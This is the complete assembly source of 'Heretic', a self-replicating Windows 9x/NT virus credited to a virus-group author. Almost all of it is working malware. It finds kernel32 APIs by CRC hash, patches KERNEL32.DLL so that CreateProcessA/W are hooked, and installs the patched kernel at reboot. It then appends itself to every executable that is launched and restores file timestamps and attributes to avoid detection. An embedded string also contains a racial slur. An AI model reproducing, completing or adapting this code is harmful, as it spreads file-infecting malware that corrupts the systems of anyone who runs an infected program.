
;
; SYNOPSIS
;
; Heretic - A Microsoft Windows 32 virus
;
; AUTHOR
;
; Memory Lapse, [NOP]
;  formerly of Phalcon/Skism
;
; ABSTRACT
;
; This virus works under all beta versions of Windows 9x, and Windows NT 4.0.
; Under a Win32s environment, the virus will fail since the kernel doesn't
; physically export any useable API. Parsing the import table of the host image
; for GetProcAddress and GetModuleHandle should do the trick.
;
; NOTES
;
; Finally after seven months (including a four month hiatus for university),
; I've finally finished this virus.
;
; Ideally when the kernel is infected, the object the virus extends
; (typically .reloc) should have its flags with IMAGE_SCN_MEM_WRITE turned off.
; This will prevent in-memory patching by antivirus software.  Heretic does
; not do this.  At least not yet.
;
; Useful reading material: Microsoft Platform, SDK, and DDK Documentation
;
; Greets to priest, h8, lookout, virogen and johnny panic.
;

.386
locals
.model  flat, stdcall
.code
.radix  16

include heretic.inc

CRC_POLY    equ     0EDB88320
CRC_INIT    equ     0FFFFFFFF

crc         macro   string
    crcReg = CRC_INIT
    irpc _x, 
        ctrlByte = '&_x&' xor (crcReg and 0ff)
        crcReg = crcReg shr 8
        rept 8
            ctrlByte = (ctrlByte shr 1) xor (CRC_POLY * (ctrlByte and 1))
        endm
        crcReg = crcReg xor ctrlByte
    endm
    dd  crcReg
endm

MARKER      equ     "DOS lives somewhere in time"

org     0

start:  push    L offset host - start           ;location of old entry point
ddOldEntryPoint =   dword ptr $ - 4

        pushfd                                  ;save state
        pushad

        call    @@delta
@@delta:pop     ebp
        sub     ebp,offset @@delta - start
                                                ;thanks vg!
        db      81,0edh                         ;sub ebp,unsignedlong
ddEntryPoint    dd 0
        add     [esp+24],ebp                    ;return address of host

        mov     edi,[esp+28]                    ;get a "random" pointer from stack
        and     edi,0FFFF0000                   ;mask off bottom word

        call    try
catch:  mov     esp,[esp+8]                     ;get pointer to our stack-based
                                                ; exception record
        jmp     finally                         ;and return to host

try:    push    dword ptr fs:[0]                ;this is our try { } block
        mov     fs:[0],esp                      ;create stack-based exception record

    .repeat
        dec     edi                             ;move back a byte
        lea     eax,[edi-MAGIC]                 ;thanks h8!

        cmp     [edi],eax                       ;match?  then we've found the kernel
    .until zero?

        mov     esi,[eax+exe_str.pe_offset]
        add     esi,eax                         ;traverse PE header and find
                                                ; Export Data Directory Table
        mov     ebp,[esi+pe_str.export_tbl]
        add     ebp,eax                         ;RVA -> absolute

        push    eax
        push    [ebp+edt_str.edt_ord_base]

        mov     ebx,[ebp+edt_str.edt_ord_rva]
        mov     edi,[ebp+edt_str.edt_name_rva]
        mov     ebp,[ebp+edt_str.edt_addr_rva]

        add     ebx,eax                         ;adjust ordinal table pointer
        add     edi,eax                         ;adjust name pointer table pointer
        add     ebp,eax                         ;adjust address pointer table pointer

        push    ebp                             ;we save these values onto the stack
        push    eax                             ; so we can free up registers

        call    @@delta
@@delta:pop     ebp
        sub     ebp,offset @@delta

        push    ebp

; on entry:
;  [esp] : delta offset
;  [esp+4] : image base
;  [esp+8] : address pointer table
;  [esp+0c] : ordinal base
;  ebx - ordinal table
;  esi - pointer to our list of apis
;  edi - name pointer table
        lea     esi,[ebp+name_ptr_api]
        mov     ecx,1
        mov     edx,(name_ptr_api_end - name_ptr_api) / 4

top:    push    edx
        push    esi

        mov     esi,[edi]                       ;calculate absolute offset of
        add     esi,[esp+0c]                    ; name pointer (image base)

        mov     edx,CRC_INIT

lup:    lodsb

        or      al,al                           ;termination token?  then quit
        jz      chkCRC

        xor     dl,al
        mov     al,8

    .repeat                                     ;perform CRC-32 on string
        shr     edx,1                           ;thanks jp!
     .if carry?
        xor     edx,CRC_POLY
     .endif
        dec     al
    .until zero?
        jmp     lup

chkCRC: pop     esi
        push    edi

        mov     ebp,ecx
        shl     ebp,1                           ;convert count into word index

        movzx   eax,word ptr [ebx+ebp]          ;calculate ordinal index
        sub     eax,[esp+14]                    ;relative to ordinal base
        shl     eax,2                           ;convert ordinal into dword index

        mov     ebp,eax
        mov     edi,[esp+10]

        add     eax,edi                         ;calculate offset
        mov     edi,[edi+ebp]                   ;RVA of API (dereference said offset)
        add     edi,[esp+0c]                    ;convert to absolute offset

        mov     ebp,[esp+8]

        cmp     edx,CRC_POLY                    ;CreateProcessA?
        org     $ - 4
            crc 
    .if zero?
        mov     [ebp+lpCreateProcessA],eax      ;hook it
        mov     [ebp+CreateProcessA],edi
    .endif
        cmp     edx,CRC_POLY                    ;or CreateProcessW?
        org     $ - 4
            crc 
    .if zero?
        mov     [ebp+lpCreateProcessW],eax      ;hook it
        mov     [ebp+CreateProcessW],edi
    .endif
        cmp     edx,[esi]                       ;or an API the virus uses?
    .if zero?
        mov     [esi+(name_ptr_api_end - name_ptr_api)],edi
        lodsd                                   ;update pointer
        dec     dword ptr [esp+4]               ;decrement our API count
    .endif
        pop     edi

next:   pop     edx
        add     edi,4                           ;next API
        inc     ecx                             ;remember displacement

        or      edx,edx                         ;no more names to parse?
        jnz     top

        pop     ebp                             ;restore delta offset
        add     esp,0c                          ;clear stack

        call    [ebp+GlobalAlloc], \            ;allocate memory for global structure
                    GMEM_FIXED, \
                    L size vir_str

        mov     edi,eax
        pop     [edi+vir_str.lpKernelBase]

        call    kernel                          ;attempt to infect the kernel

        call    [ebp+GlobalFree], \             ;release global structure resources
                    edi

finally:pop     dword ptr fs:[0]                ;this is our finally { } block
        pop     eax                             ;trash exception handler address
                                                ;low and behold, the stack is restored
        popad
        popfd

        ret

        db      '[nop] 4 life.. lapse, vg and jp own you! :)'

infect: mov     [edi+vir_str.ddError],TRUE      ;assume an error occurred

        call    [ebp+GetFileAttributesA], \
                    [edi+vir_str.lpFileName]

        mov     [edi+vir_str.ddFilterAttributes],eax
        inc     eax
        jz      exit

        call    [ebp+SetFileAttributesA], \     ;strip file attributes
                    [edi+vir_str.lpFileName], \
                    FILE_ATTRIBUTE_NORMAL

        or      eax,eax                         ;error?  possibly a r/o disk?
        jz      exit

        call    [ebp+CreateFileA], \
                    [edi+vir_str.lpFileName], \
                    GENERIC_READ or GENERIC_WRITE, \
                    FILE_SHARE_NOTSHARED, \
                    NULL, \
                    OPEN_EXISTING, \
                    FILE_ATTRIBUTE_NORMAL, \
                    NULL

        mov     [edi+vir_str.hFile],eax         ;if we don't get a valid file
        inc     eax                             ;descriptor (ie. an invalid handle),
        jz      exitChmod                       ;quit processing

        lea     eax,[edi+vir_str.ddLastWriteTime]
        lea     ecx,[edi+vir_str.ddLastAccessTime]
        lea     edx,[edi+vir_str.ddCreationTime]
        call    [ebp+GetFileTime], \            ;save file timestamps
                    [edi+vir_str.hFile], \
                    edx, \
                    ecx, \
                    eax

        call    [ebp+CreateFileMappingA], \     ;create a mmap object
                    [edi+vir_str.hFile], \
                    NULL, \
                    PAGE_READONLY, \
                    L 0, \
                    L 0, \
                    NULL

        or      eax,eax
        jz      exitTime

        mov     [edi+vir_str.hFileMappingObject],eax

        call    [ebp+MapViewOfFile], \          ;view the file in our address space
                    [edi+vir_str.hFileMappingObject], \
                    FILE_MAP_READ, \
                    L 0, \
                    L 0, \
                    L 0

        or      eax,eax
        jz      exitCloseMap

        mov     [edi+lpBaseAddress],eax

        cmp     word ptr [eax],IMAGE_DOS_SIGNATURE
        jnz     exitUnmap                       ;some sort of executable?

        mov     esi,eax
        add     esi,[eax+exe_str.pe_offset]     ;seek to NT header

        push    eax
        call    [ebp+IsBadCodePtr], \           ;can we read the memory at least?
                    esi                         ;potentially not a Windows file?

        or      eax,eax
        pop     eax
        jnz     exitUnmap

        cmp     dword ptr [esi],IMAGE_NT_SIGNATURE
        jnz     exitUnmap                       ;PE file?

        cmp     [esi+pe_str.timestamp],CRC_POLY
        org     $ - 4
            crc MARKER
        jz      exitUnmap

        lea     eax,[ebp+infectKernel]

        cmp     [edi+vir_str.lpInfectMethod],eax;attempting to infect KERNEL32.DLL?
    .if !zero?
        test    [esi+pe_str.flags],IMAGE_FILE_DLL
        jnz     exitUnmap                       ;and not a runtime library?
    .endif
        call    getLastObjectTable

        mov     eax,[ebx+obj_str.obj_psize]
        add     eax,[ebx+obj_str.obj_poffset]

        add     eax,(_end - start)              ;calculate maximum infected file size
        mov     ecx,[esi+pe_str.align_file]
        call    align

        mov     [edi+vir_str.ddFileSizeInfected],eax

        call    [ebp+UnmapViewOfFile], \
                    [edi+vir_str.lpBaseAddress]

        call    [ebp+CloseHandle], \
                    [edi+vir_str.hFileMappingObject]

        call    [ebp+CreateFileMappingA], \     ;reopen and extend mmap file
                    [edi+vir_str.hFile], \
                    NULL, \
                    PAGE_READWRITE, \
                    L 0, \
                    [edi+vir_str.ddFileSizeInfected], \
                    NULL

        mov     [edi+vir_str.hFileMappingObject],eax

        call    [ebp+MapViewOfFile], \
                    [edi+vir_str.hFileMappingObject], \
                    FILE_MAP_WRITE, \
                    L 0, \
                    L 0, \
                    L 0

        mov     [edi+vir_str.lpBaseAddress],eax

        add     eax,[eax+exe_str.pe_offset]
        mov     esi,eax

        call    getLastObjectTable

        mov     eax,[ebx+obj_str.obj_rva]       ;set new entry point if an EXE
        add     eax,[ebx+obj_str.obj_psize]     ; or set hooks if kernel32.dll
        call    [edi+vir_str.lpInfectMethod]

        push    edi
        push    esi

        mov     edi,[edi+vir_str.lpBaseAddress]
        add     edi,[ebx+obj_str.obj_poffset]
        add     edi,[ebx+obj_str.obj_psize]
        lea     esi,[ebp+start]
        mov     ecx,(_end - start)
        cld
        rep     movsb                           ;copy virus

        pop     esi
        pop     eax

        xchg    eax,edi
        sub     eax,[edi+vir_str.lpBaseAddress] ;new psize = old psize + (_end - start)
        sub     eax,[ebx+obj_str.obj_poffset]
        mov     ecx,[esi+pe_str.align_file]
        call    align                           ;calculate new physical size

        mov     [ebx+obj_str.obj_psize],eax

        mov     eax,[ebx+obj_str.obj_vsize]
        add     eax,(_end - start)
        mov     ecx,[esi+pe_str.align_obj]
        call    align                           ;calculate potential new virtual size

        cmp     eax,[ebx+obj_str.obj_psize]     ;if new physical size > new virtual size
    .if carry?
        mov     eax,[ebx+obj_str.obj_psize]     ;then let the virtual size = physical size
    .endif
        mov     [ebx+obj_str.obj_vsize],eax

        add     eax,[ebx+obj_str.obj_rva]

        cmp     eax,[esi+pe_str.size_image]     ;infected host increased in image size?
    .if !carry?
        mov     [esi+pe_str.size_image],eax
    .endif

        mov     [esi+pe_str.timestamp],CRC_POLY
        org     $ - 4
            crc MARKER
        or      [ebx+obj_str.obj_flags],IMAGE_SCN_CNT_INITIALIZED_DATA or IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE

        lea     eax,[ebp+szImageHlp]
        call    [ebp+LoadLibraryA], \           ;load image manipulation library
                    eax

        or      eax,eax
    .if !zero?
        push    eax                             ;(*) argument for FreeLibrary()

        lea     ecx,[ebp+szChecksumMappedFile]
        call    [ebp+GetProcAddress], \         ;get address of image checksum api
                    eax, \
                    ecx

        or      eax,eax
     .if !zero?
        lea     ecx,[esi+pe_str.pe_cksum]
        lea     edx,[edi+vir_str.ddBytes]
        call    eax, \                          ;calculate checksum
                    [edi+vir_str.lpBaseAddress], \
                    [edi+vir_str.ddFileSizeInfected], \
                    edx, \
                    ecx
     .endif
        call    [ebp+FreeLibrary]               ;argument is set at (*)
    .endif
        mov     [edi+vir_str.ddError],FALSE     ;no errors!

exitUnmap:
        call    [ebp+UnmapViewOfFile], \        ;unmap the view
                    [edi+vir_str.lpBaseAddress]
exitCloseMap:
        call    [ebp+CloseHandle], \            ;remove mmap from our address space
                    [edi+vir_str.hFileMappingObject]
exitTime:
        lea     eax,[edi+vir_str.ddLastWriteTime]
        lea     ecx,[edi+vir_str.ddLastAccessTime]
        lea     edx,[edi+vir_str.ddCreationTime]
        call    [ebp+SetFileTime], \            ;restore file time
                    [edi+vir_str.hFile], \
                    edx, \
                    ecx, \
                    eax

        call    [ebp+CloseHandle], \            ;close the file
                    [edi+vir_str.hFile]
exitChmod:
        call    [ebp+SetFileAttributesA], \     ;restore file attributes
                    [edi+vir_str.lpFileName], \
                    [edi+vir_str.ddFilterAttributes]
exit:   ret                                     ;return to caller

kernel: call    [ebp+GlobalAlloc], \            ;allocate memory for source buffer
                    GMEM_FIXED, \
                    _MAX_PATH

        mov     [edi+vir_str.lpSrcFile],eax

        call    [ebp+GetSystemDirectoryA], \    ;store %sysdir% in source buffer
                    eax, \
                    _MAX_PATH

        call    [ebp+GlobalAlloc], \            ;allocate memory for destination buffer
                    GMEM_FIXED, \
                    _MAX_PATH

        mov     [edi+vir_str.lpDstFile],eax

        call    [ebp+GetWindowsDirectoryA], \   ;store %windir% in destination buffer
                    eax, \
                    _MAX_PATH

        lea     eax,[ebp+szKernel]
        call    [ebp+lstrcatA], \               ;*lpSrcFile = %sysdir%\kernel32.dll
                    [edi+vir_str.lpSrcFile], \
                    eax

        lea     eax,[ebp+szKernel]
        call    [ebp+lstrcatA], \               ;*lpDstFile = %windir%\kernel32.dll
                    [edi+vir_str.lpDstFile], \
                    eax

        call    [ebp+CopyFileA], \
                    [edi+vir_str.lpSrcFile], \  ;%sysdir%\kernel32.dll
                    [edi+vir_str.lpDstFile], \  ; -> %windir%\kernel32.dll
                    FALSE

        lea     eax,[ebp+infectKernel]
        mov     [edi+lpInfectMethod],eax        ;we're trying to infect the kernel

        mov     eax,[edi+vir_str.lpDstFile]
        mov     [edi+vir_str.lpFileName],eax

        call    infect

    .if [edi+vir_str.ddError] == FALSE
        lea     eax,[ebp+szSetupApi]
        call    [ebp+LoadLibraryA], \
                    eax

        or      eax,eax                         ;if LoadLibrary fails, explicitly write
     .if zero?                                  ;to WININIT.INI (Windows 95)
        lea     eax,[ebp+szWinInitFile]         ;delete the original kernel
        push    eax
        push    [edi+vir_str.lpSrcFile]
        lea     eax,[ebp+szKeyName]
        push    eax
        lea     eax,[ebp+szAppName]
        push    eax
        call    [ebp+WritePrivateProfileStringA]

        lea     eax,[ebp+szWinInitFile]         ;move our patched kernel
        push    eax
        push    [edi+vir_str.lpDstFile]
        push    [edi+vir_str.lpSrcFile]
        lea     eax,[ebp+szAppName]
        push    eax
        call    [ebp+WritePrivateProfileStringA]
     .else
        push    eax                             ;(*) argument for FreeLibrary

        lea     ebx,[ebp+szSetupInstallFileExA] ;fetch address of API from this DLL
        call    [ebp+GetProcAddress], \
                    eax, \
                    ebx

        or      eax,eax
      .if !zero?
        lea     ebx,[edi+ddBytes]
        call    eax, \                          ;move patched kernel
                    NULL, \                     ;NT->delay until next reboot
                    NULL, \                     ; modified MoveFileEx behaviour?
                    [edi+vir_str.lpDstFile], \  ;98->WININIT.INI
                    NULL, \
                    [edi+vir_str.lpSrcFile], \
                    SP_COPY_SOURCE_ABSOLUTE or SP_COPY_DELETESOURCE, \
                    NULL, \
                    NULL, \
                    ebx
      .endif
        mov     esi,eax
        call    [ebp+FreeLibrary]
        mov     eax,esi
     .endif
        or      eax,eax
     .if zero?
        mov     [edi+vir_str.ddError],TRUE
     .endif
    .endif

    .if [edi+vir_str.ddError] == TRUE
        call    [ebp+DeleteFileA], \            ;delete %windir%\kernel32.dll if
                    [edi+vir_str.lpFileName]    ; an error infecting or moving
    .endif
        call    [ebp+GlobalFree], \             ;deallocate destination buffer
                    [edi+vir_str.lpDstFile]

        call    [ebp+GlobalFree], \             ;deallocate source buffer
                    [edi+vir_str.lpSrcFile]
        ret

infectKernel:
        xchg    eax,ecx

        movzx   eax,[esi+pe_str.size_NThdr]
        add     eax,esi
        add     eax,offset pe_str.majik

        mov     edx,0
lpCreateProcessA    =   dword ptr $ - 4
        sub     edx,[edi+vir_str.lpKernelBase]

@@lup:  cmp     [eax+obj_str.obj_rva],edx       ;was the API in the previous object?
        ja      @@next

        add     eax,size obj_str                ;next object
        jmp     @@lup

@@next: sub     eax,size obj_str                ;seek back to export object

        push    L offset hookCreateProcessA - start
        call    trapAPI

        mov     edx,0
lpCreateProcessW    =   dword ptr $ - 4
        sub     edx,[edi+vir_str.lpKernelBase]

        push    L offset hookCreateProcessW - start
        call    trapAPI

        ret

infectEXE:
        mov     [ebp+ddEntryPoint],eax
        xchg    eax,[esi+pe_str.rva_entry]

        mov     [ebp+ddOldEntryPoint],eax

        ret

trapAPI:push    ebx
        push    ecx

        mov     ebx,[eax+obj_str.obj_poffset]
        sub     ebx,[eax+obj_str.obj_rva]
        add     ebx,[edi+vir_str.lpBaseAddress]
        add     ebx,edx

        add     ecx,[esp+0c]
        mov     [ebx],ecx

        pop     ecx
        pop     ebx
        ret     4

align:  xor     edx,edx
        add     eax,ecx
        dec     eax
        div     ecx
        mul     ecx
        ret

getLastObjectTable:
        movzx   eax,[esi+pe_str.num_obj]
        cdq
        mov     ecx,L size obj_str
        dec     eax
        mul     ecx

        movzx   edx,[esi+pe_str.size_NThdr]
        add     eax,edx
        add     eax,esi
        add     eax,offset pe_str.majik         ;seek to last object table

        xchg    eax,ebx
        ret

;on entry:
; [esp] : return address to caller
; [esp+4] -> [esp+28] : registers
; [esp+2c] : return address to process
; [esp+34] : commandline
hookInfectUnicode:
        call    @@delta
@@delta:pop     ebp
        sub     ebp,offset @@delta

        mov     edi,[esp+34]
        call    [ebp+WideCharToMultiByte], \    ;find out how many bytes to allocate
                    CP_ACP, \                   ; ANSI code page
                    L 0, \                      ; no composite/unmapped characters
                    edi, \                      ; lpWideCharStr
                    L -1, \                     ; calculate strlen(lpWideCharStr)+1
                    NULL, \                     ; no buffer
                    L 0, \                      ; tell us how many bytes to allocate
                    NULL, \                     ; ignore unmappable characters
                    NULL                        ; don't tell us about problems

        or      eax,eax                         ;no bytes can be converted?
        jz      hookInfectError                 ;then bomb out.

        push    eax                             ;(*)

        call    [ebp+GlobalAlloc], \            ;allocate enough memory for the
                    GMEM_FIXED, \               ; converted UNICODE string
                    eax

        or      eax,eax                         ;any memory available?
        pop     ecx                             ;(*)
        jz      hookInfectError

        mov     esi,eax
        mov     edi,[esp+34]
        call    [ebp+WideCharToMultiByte], \    ;UNICODE -> ANSI conversion
                    CP_ACP, \                   ; ANSI code page
                    L 0, \                      ; no composite/unmappable characters
                    edi, \                      ; lpWideCharStr
                    L -1, \                     ; calculate strlen(lpWideCharStr)+1
                    esi, \                      ; destination buffer for ANSI characters
                    ecx, \                      ; size of destination buffer
                    NULL, \                     ; ignore unmappable characters
                    NULL                        ; don't tell us about problems
        jmp     hookInfectDispatch

;on entry:
; [esp] : return address to caller
; [esp+4] -> [esp+28] : registers
; [esp+2c] : return address to process
; [esp+34] : commandline
hookInfectAnsi:
        call    @@delta
@@delta:pop     ebp
        sub     ebp,offset @@delta

        mov     edi,[esp+34]                    ;get the filename

        call    [ebp+lstrlenA], \               ;calculate string length
                    edi                         ; (not including null terminator)

        or      eax,eax                         ;zero length?
        jz      hookInfectError

        inc     eax                             ;include null terminator

        call    [ebp+GlobalAlloc], \            ;allocate some memory for the copy
                    GMEM_FIXED, \
                    eax

        or      eax,eax                         ;no memory?
        jz      hookInfectError

        mov     esi,eax

        call    [ebp+lstrcpyA], \               ;*edi -> *esi
                esi, \
                edi

hookInfectDispatch:
        push    esi                             ;(*) argument for GlobalFree

        call    [ebp+GlobalAlloc], \            ;instantiate our global structure
                    GMEM_FIXED, \
                    L size vir_str

        or      eax,eax                         ;fatal error if no memory
        jz      hookInfectErrorFree

        mov     edi,eax
        mov     [edi+vir_str.lpFileName],esi
        mov     [edi+vir_str.ddError],FALSE     ;assume no parsing fix-ups required

        lodsb
        cmp     al,'"'
    .if zero?
        mov     [edi+vir_str.lpFileName],esi
        mov     [edi+vir_str.ddError],TRUE      ;parsing fix-ups required
    .endif

hookInfectParse:
        lodsb                                   ;get a byte
    .if [edi+vir_str.ddError] == TRUE           ;need a fix-up?
        cmp     al,'"'                          ;'"' is our terminator
        jnz     hookInfectParse
    .else                                       ;no fix-up required
        cmp     al,' '                          ;' ' or \0 is our terminator
        jz      hookInfectParsed
        or      al,al
        jnz     hookInfectParse
    .endif

hookInfectParsed:
        mov     byte ptr [esi-1],NULL           ;null terminate string

        lea     eax,[ebp+infectEXE]             ;we're infecting a non-kernel32 executable
        mov     [edi+vir_str.lpInfectMethod],eax
        call    infect

        call    [ebp+GlobalFree], \             ;deallocate global structure
                    edi
hookInfectErrorFree:
        call    [ebp+GlobalFree]                ;deallocate lpFileName
hookInfectError:
        ret

hookCreateProcessW:
        push    CRC_POLY
CreateProcessW      =   dword ptr $ - 4

hookUnicode:
        pushfd
        pushad
        call    hookInfectUnicode
        popad
        popfd
        ret

hookCreateProcessA:
        push    CRC_POLY
CreateProcessA      =   dword ptr $ - 4

hookAnsi:
        pushfd
        pushad
        call    hookInfectAnsi
        popad
        popfd
        ret

className                       db  '[Heretic] by Memory Lapse',0
message                         db  'For my thug niggaz.. uptown baby, uptown.',0

szKernel                        db  '\KERNEL32.DLL',0

szImageHlp                      db  'IMAGEHLP',0
szChecksumMappedFile            db  'CheckSumMappedFile',0
szSetupApi                      db  'SETUPAPI',0
szSetupInstallFileExA           db  'SetupInstallFileExA',0

szWinInitFile                   db  'WININIT.INI',0
szAppName                       db  'Rename',0
szKeyName                       db  'NUL',0

name_ptr_api:
ddCloseHandle:                  crc 
ddCopyFileA:                    crc 
ddCreateFileA:                  crc 
ddCreateFileMappingA:           crc 
ddDeleteFileA:                  crc 
ddFreeLibrary:                  crc 
ddGetFileAttributesA:           crc 
ddGetFileTime:                  crc 
ddGetProcAddress:               crc 
ddGetSystemDirectoryA:          crc 
ddGetWindowsDirectoryA:         crc 
ddGlobalAlloc:                  crc 
ddGlobalFree:                   crc 
ddIsBadCodePtr:                 crc 
ddLoadLibraryA:                 crc 
ddMapViewOfFile:                crc 
ddSetFileAttributesA:           crc 
ddSetFileTime:                  crc 
ddUnmapViewOfFile:              crc 
ddWideCharToMultiByte:          crc 
ddWritePrivateProfileStringA:   crc 
ddlstrcatA:                     crc 
ddlstrcpyA:                     crc 
ddlstrlenA:                     crc 
name_ptr_api_end:

; absolute offsets of desired API
CloseHandle                     dd  0
CopyFileA                       dd  0
CreateFileA                     dd  0
CreateFileMappingA              dd  0
DeleteFileA                     dd  0
FreeLibrary                     dd  0
GetFileAttributesA              dd  0
GetFileTime                     dd  0
GetProcAddress                  dd  0
GetSystemDirectoryA             dd  0
GetWindowsDirectoryA            dd  0
GlobalAlloc                     dd  0
GlobalFree                      dd  0
IsBadCodePtr                    dd  0
LoadLibraryA                    dd  0
MapViewOfFile                   dd  0
SetFileAttributesA              dd  0
SetFileTime                     dd  0
UnmapViewOfFile                 dd  0
WideCharToMultiByte             dd  0
WritePrivateProfileStringA      dd  0
lstrcatA                        dd  0
lstrcpyA                        dd  0
lstrlenA                        dd  0

_end:

host:   call    MessageBoxA, \
                    NULL, \
                    L offset lpText, \
                    L offset lpCaption, \
                    L 0                         ;MB_OK

        call    ExitProcess, \
                    L 0

.data
lpCaption       db      'Memory Lapse has something to say..',0
lpText          db      'Hello World!',0

end     start

